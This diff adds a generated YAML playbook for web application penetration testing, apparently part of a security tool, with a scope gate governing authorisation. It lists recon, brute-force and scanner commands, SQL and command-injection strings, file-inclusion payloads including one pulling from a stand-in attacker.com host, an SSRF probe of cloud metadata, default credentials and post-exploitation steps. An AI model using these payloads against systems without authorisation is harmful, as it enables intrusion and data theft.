@@ -1,0 +1,309 @@
+# GENERATED from web_methodology.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: web_methodology
+title: Web Application Penetration Testing Methodology
+source: web_methodology.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: initial-reconnaissance
+  name: Initial Reconnaissance
+  steps:
+  - id: initial-reconnaissance.technology-fingerprinting
+    title: Technology Fingerprinting
+    access_required: none
+    mutates: false
+    source_line: 8
+    commands:
+    - lang: bash
+      command: whatweb http://{target}
+    - lang: bash
+      command: wappalyzer http://{target}
+    - lang: bash
+      command: nmap -sV -sC -p80,443 --script=http-* {target}
+    checks:
+    - Web server (Apache, Nginx, IIS)
+    - Framework (Django, Rails, Laravel, Spring)
+    - CMS (WordPress, Drupal, Joomla)
+    - Programming language (PHP, Python, Java, .NET)
+  - id: initial-reconnaissance.ssl-tls-analysis-https
+    title: SSL/TLS Analysis (HTTPS)
+    access_required: none
+    mutates: false
+    source_line: 26
+    commands:
+    - lang: bash
+      command: sslscan {target}
+    - lang: bash
+      command: testssl.sh {target}
+    - lang: bash
+      command: sslyze {target}
+    checks:
+    - Weak protocols (SSLv2, SSLv3, TLS 1.0)
+    - Weak ciphers
+    - Certificate issues
+    - HSTS header
+  - id: initial-reconnaissance.header-analysis
+    title: Header Analysis
+    access_required: none
+    mutates: false
+    source_line: 44
+    commands:
+    - lang: bash
+      command: curl -I http://{target}
+    checks:
+    - X-Frame-Options
+    - X-Content-Type-Options
+    - X-XSS-Protection
+    - Content-Security-Policy
+    - Strict-Transport-Security
+- id: content-discovery
+  name: Content Discovery
+  steps:
+  - id: content-discovery.directory-file-bruteforce
+    title: Directory/File Bruteforce
+    access_required: credential
+    mutates: false
+    source_line: 58
+    commands:
+    - lang: bash
+      command: gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 50
+    - lang: bash
+      command: feroxbuster -u http://{target} -w /usr/share/wordlists/dirb/common.txt
+    - lang: bash
+      command: dirsearch -u http://{target}
+    - lang: bash
+      command: ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt
+  - id: content-discovery.common-files-to-check
+    title: Common Files to Check
+    access_required: none
+    mutates: false
+    source_line: 73
+    checks:
+    - '`/robots.txt` - disallowed paths'
+    - '`/sitemap.xml` - site structure'
+    - '`/.git/` - exposed git repository'
+    - '`/.svn/` - exposed SVN'
+    - '`/backup/`, `/old/`, `/dev/` - backup directories'
+    - '`/admin/`, `/administrator/`, `/manager/`'
+    - '`/api/`, `/api/v1/`, `/swagger/`, `/api-docs/`'
+    - '`/phpinfo.php`, `/info.php`'
+    - '`/.env`, `/config.php`, `/wp-config.php`'
+  - id: content-discovery.virtual-host-discovery
+    title: Virtual Host Discovery
+    access_required: credential
+    mutates: false
+    source_line: 84
+    commands:
+    - lang: bash
+      command: 'ffuf -u http://{target} -H "Host: FUZZ.{target}" -w subdomains.txt -fs {size}'
+    - lang: bash
+      command: gobuster vhost -u http://{target} -w subdomains.txt
+- id: vulnerability-scanning
+  name: Vulnerability Scanning
+  steps:
+  - id: vulnerability-scanning.nikto
+    title: Nikto
+    access_required: none
+    mutates: false
+    source_line: 95
+    commands:
+    - lang: bash
+      command: nikto -h http://{target}
+  - id: vulnerability-scanning.nuclei
+    title: Nuclei
+    access_required: credential
+    mutates: false
+    source_line: 100
+    commands:
+    - lang: bash
+      command: nuclei -u http://{target}
+    - lang: bash
+      command: nuclei -u http://{target} -tags cve,misconfig,exposure
+    - lang: bash
+      command: nuclei -u http://{target} -severity critical,high
+  - id: vulnerability-scanning.wpscan-wordpress
+    title: WPScan (WordPress)
+    access_required: none
+    mutates: false
+    source_line: 112
+    commands:
+    - lang: bash
+      command: wpscan --url http://{target} --enumerate vp,vt,u
+  - id: vulnerability-scanning.droopescan-drupal-joomla
+    title: Droopescan (Drupal/Joomla)
+    access_required: credential
+    mutates: false
+    source_line: 117
+    commands:
+    - lang: bash
+      command: droopescan scan drupal -u http://{target}
+- id: manual-testing
+  name: Manual Testing
+  steps:
+  - id: manual-testing.sql-injection
+    title: SQL Injection
+    access_required: credential
+    mutates: false
+    source_line: 124
+    commands:
+    - lang: bash
+      command: sqlmap -u "http://{target}/page?id=1" --batch --dbs
+    - lang: bash
+      command: ''' OR ''1''=''1'
+    - lang: bash
+      command: ''' OR ''1''=''1'' --'
+    - lang: bash
+      command: ''' UNION SELECT NULL--'
+  - id: manual-testing.xss-cross-site-scripting
+    title: XSS (Cross-Site Scripting)
+    access_required: none
+    mutates: false
+    source_line: 135
+  - id: manual-testing.lfi-rfi-file-inclusion
+    title: LFI/RFI (File Inclusion)
+    access_required: none
+    mutates: true
+    source_line: 143
+    commands:
+    - lang: unknown
+      command: ?file=../../../etc/passwd
+    - lang: unknown
+      command: ?file=....//....//....//etc/passwd
+    - lang: unknown
+      command: ?file=/etc/passwd%00
+    - lang: unknown
+      command: ?file=php://filter/convert.base64-encode/resource=index.php
+    - lang: unknown
+      command: ?file=http://attacker.com/shell.txt
+  - id: manual-testing.ssrf-server-side-request-forgery
+    title: SSRF (Server-Side Request Forgery)
+    access_required: none
+    mutates: true
+    source_line: 155
+    commands:
+    - lang: unknown
+      command: ?url=http://127.0.0.1
+    - lang: unknown
+      command: ?url=http://localhost
+    - lang: unknown
+      command: '?url=http://169.254.169.254/  # AWS metadata'
+    - lang: unknown
+      command: ?url=file:///etc/passwd
+  - id: manual-testing.command-injection
+    title: Command Injection
+    access_required: none
+    mutates: false
+    source_line: 163
+    commands:
+    - lang: bash
+      command: ; id
+    - lang: bash
+      command: '| id'
+    - lang: bash
+      command: '`id`'
+    - lang: bash
+      command: $(id)
+    - lang: bash
+      command: '& id'
+    - lang: bash
+      command: '&& id'
+    - lang: bash
+      command: '|| id'
+  - id: manual-testing.xxe-xml-external-entity
+    title: XXE (XML External Entity)
+    access_required: none
+    mutates: false
+    source_line: 174
+- id: authentication-testing
+  name: Authentication Testing
+  steps:
+  - id: authentication-testing.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 185
+    checks:
+    - admin:admin
+    - admin:password
+    - admin:123456
+    - root:root
+    - test:test
+  - id: authentication-testing.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 192
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt {target} http-get /admin/
+  - id: authentication-testing.session-testing
+    title: Session Testing
+    access_required: none
+    mutates: false
+    source_line: 201
+    checks:
+    - Session fixation
+    - Session hijacking
+    - Cookie security flags (HttpOnly, Secure)
+    - Session timeout
+- id: api-testing
+  name: API Testing
+  steps:
+  - id: api-testing.discovery
+    title: Discovery
+    access_required: none
+    mutates: false
+    source_line: 209
+    commands:
+    - lang: bash
+      command: /api/
+    - lang: bash
+      command: /api/v1/
+    - lang: bash
+      command: /api/v2/
+    - lang: bash
+      command: /swagger/
+    - lang: bash
+      command: /swagger-ui/
+    - lang: bash
+      command: /api-docs/
+    - lang: bash
+      command: /openapi.json
+  - id: api-testing.testing
+    title: Testing
+    access_required: none
+    mutates: false
+    source_line: 221
+    checks:
+    - Authentication bypass
+    - IDOR (Insecure Direct Object Reference)
+    - Mass assignment
+    - Rate limiting
+    - Input validation
+- id: post-exploitation
+  name: Post-Exploitation
+  steps:
+  - id: post-exploitation.web-shell-upload
+    title: Web Shell Upload
+    access_required: shell
+    mutates: false
+    source_line: 252
+  - id: post-exploitation.database-access
+    title: Database Access
+    access_required: shell
+    mutates: false
+    source_line: 258
+    checks:
+    - Extract database credentials from config files
+    - Dump database contents
+    - Look for password hashes
